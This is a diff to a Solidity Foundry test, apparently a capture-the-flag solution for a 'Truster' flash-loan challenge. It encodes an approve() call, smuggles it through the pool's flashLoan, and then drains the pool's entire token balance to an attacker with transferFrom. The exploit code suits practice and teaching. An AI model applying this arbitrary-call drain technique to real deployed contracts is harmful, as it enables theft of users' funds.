@@ -42,9 +42,9 @@ contract Truster is Test {
         // Create the malicious bytes payload
 
         bytes memory approveUserAttack = abi.encodeWithSignature(
-            "approve(address, uint256)",
+            "approve(address,uint256)",
             address(attacker),
-            type(uint256).max
+            dvt.balanceOf(address(trusterLenderPool))
         );
 
         trusterLenderPool.flashLoan(
@@ -54,10 +54,15 @@ contract Truster is Test {
             approveUserAttack
         );
 
+        emit log_named_uint(
+            "(attacker) allowance after flashLoan ",
+            dvt.allowance(address(trusterLenderPool), address(attacker))
+        );
+
         dvt.transferFrom(
             address(trusterLenderPool),
             address(attacker),
-            1_000_000e18
+            dvt.balanceOf(address(trusterLenderPool))
         );
 
         vm.stopPrank();
